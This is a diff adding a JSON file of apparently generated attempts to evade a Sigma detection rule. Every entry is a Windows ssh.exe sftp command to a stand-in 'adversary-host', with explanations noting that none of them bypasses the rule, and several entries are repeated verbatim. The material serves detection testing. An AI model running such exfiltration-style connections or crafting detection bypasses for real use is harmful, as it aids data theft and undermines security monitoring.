@@ -1,0 +1,30 @@
+[
+  {
+    "output": "\"C:\\WINDOWS\\System32\\OpenSSH\\ssh.exe\" -x -oPermitLocalCommand=no -oClearAllForwardings=yes -oRemoteCommand=none -oRequestTTY=no -oForwardAgent=no -l adversary -s -- adversary-host sftp",
+    "explanation": "This is the original true positive command and cannot be considered a bypass."
+  },
+  {
+    "output": "\"C:\\WINDOWS\\System32\\OpenSSH\\ssh.exe\" -x -o PermitLocalCommand=no -o ClearAllForwardings=yes -o RemoteCommand=none -o RequestTTY=no -o ForwardAgent=no -l adversary -s -- adversary-host sftp",
+    "explanation": "Spaces were inserted between option names and values for obfuscation, but the command remains valid and would still trigger the Sigma rule."
+  },
+  {
+    "output": "\"C:\\WINDOWS\\System32\\OpenSSH\\ssh.exe\" -x -oPermitLocalCommand=no -oClearAllForwardings=yes -oRemoteCommand=none -oRequestTTY=no -oForwardAgent=no -l adversary -s -- adversary-host sftp",
+    "explanation": "This is the original true positive command and cannot be considered a bypass."
+  },
+  {
+    "output": "\"C:\\WINDOWS\\System32\\OpenSSH\\ssh.exe\" -x -oPermitLocalCommand=no -oClearAllForwardings=yes -oRemoteCommand=none -oRequestTTY=no -oForwardAgent=no -l adversary -s -- adversary-host sftp",
+    "explanation": "This is the original true positive command and cannot be considered a bypass."
+  },
+  {
+    "output": "\"C:\\\\WINDOWS\\\\System32\\\\OpenSSH\\\\ssh.exe\" -x -oPermitLocalCommand=no -oClearAllForwardings=yes -oRemoteCommand=none -oRequestTTY=no -oForwardAgent=no -l adversary -s -- adversary-host sftp",
+    "explanation": "Double backslashes were used in the path for obfuscation, but the command remains valid and would still trigger the Sigma rule."
+  },
+  {
+    "output": "\"C:\\\\WINDOWS\\\\System32\\\\OpenSSH\\\\ssh.exe\" -x -oPermitLocalCommand=no -oClearAllForwardings=yes -oRemoteCommand=none -oRequestTTY=no -oForwardAgent=no -l adversary -s -- adversary-host sftp",
+    "explanation": "Double backslashes were used in the path for obfuscation, but the command remains valid and would still trigger the Sigma rule."
+  },
+  {
+    "output": "",
+    "explanation": "No safe bypass command can be generated."
+  }
+]
